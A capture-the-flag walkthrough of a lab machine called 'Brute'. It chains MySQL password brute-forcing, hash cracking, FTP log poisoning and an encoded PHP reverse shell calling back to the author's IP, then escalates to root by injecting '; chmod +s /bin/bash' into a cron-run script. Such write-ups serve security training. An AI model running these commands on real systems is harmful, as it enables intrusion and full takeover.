Brute

Target IP: 10.10.40.198
Challenge Description: You won't be able to just brute your way into this one, or will you?

Reconnaissance


Doing a port scan shows there are four TCP ports open on the target machine, as shown above.


Performing an aggressive port scan against the open TCP ports returns the result above.

Enumeration

Port 3306: MySQL

I started enumeration with this application. I tried using the default credentials root:root, but it did not work. However, I tried to bruteforce the password of user root using the command hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.40.198 -t 4 and got a hit, as shown above. Now I have the credentials root:rockyou.


Using the credentials I bruteforced, I managed to login to the MySQL application on the target machine. There is an interesting database called website. This database has a table called users, as shown above.


And running the SQL statement SELECT * FROM users; returns the row above. There is one user called Adrian. The password hash of this user is also returned. I copied the password hash of this user to my machine to crack it via john.


And using john, I cracked the password tigger of the user Adrian as shown above. Now I have another set of credentials which is Adrian:tigger, for the HTTP application on port 80 .

Port 80: HTTP

Browsing to this port displays the login webpage above. I did not find anything useful when viewing the source-code of the webpage.


I used the credentials Adrian:tigger and logged in successfully. The webpage above is presented to me after logging in. There is a button called Log.


Pressing the button Log displays some sort of log data, as shown above. After some enumeration, I found out this log data is for all invalid FTP login attempts. I can poison this log file by sending a PHP payload.

Exploitation


I connected to the FTP application. Then I deployed my PHP payload at the username to poison it, as shown above.


And I sent the command ls to obtain the result above. There is an interesting file called config.php, as shown above. Maybe this PHP file contains sensitive data like password? After checking it, it contains the credentials I already obtained.


I started a listener on my machine at port 8443. Since the target machine is already using PHP, I deployed the URL-encoded PHP reverse shell php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. After deploying it, I had to press the Log button to activate it. And then I obtained a reverse shell connection on my machine with the session as www-data. Now I have a foothold on the target machine :)

Privilege Escalation


There is an interesting file with the name .reminder that I can read. The content of this file is shown above. This file informs me to use the rule best64 from hashcat and append ! to every password. There is also the text ettubrute which I am guessing I have to generate the possible passwords with this new rule.


On my machine, I created two files: exclam.rule and password.txt. The password.txt file contains the string ettubrute. And the file exclam.rule contains the new rule $! to append ! to all generated password. Then using the command hashcat --force password.txt -r exclam.rule -r /usr/share/hashcat/rules/best64.rule --stdout > wordlist.txt, I generated the possible passwords as shown above. In total there are seventy-seven generated passwords using the two rules.


Using hydra, I bruteforced the SSH login of the user adrian and obtained the password theettubrute! from the generated passwords list as shown above.


And I succesfully connected to the target machine via SSH as the user adrian. I managed to elevate my privileges horizontally from the user www-data to the user adrian as shown above.


The ftp directory located at this user's home directory contains the two interesting files above. The script above seems to be executing the input from the punch_in file located at /home/adrian.


I found the script that is responsible for doing the checking in. This script is run every minute. I can perform command injection by separating the commands by ;.


I tried injecting reverse shell scripts at first but I had no luck. Then I switched to the command ; chmod +s /bin/bash. And afer a while, the command was executed and the /bin/bash was changed with SUID bit set. Executing the command bash -p gives me a root bash shell. GG.
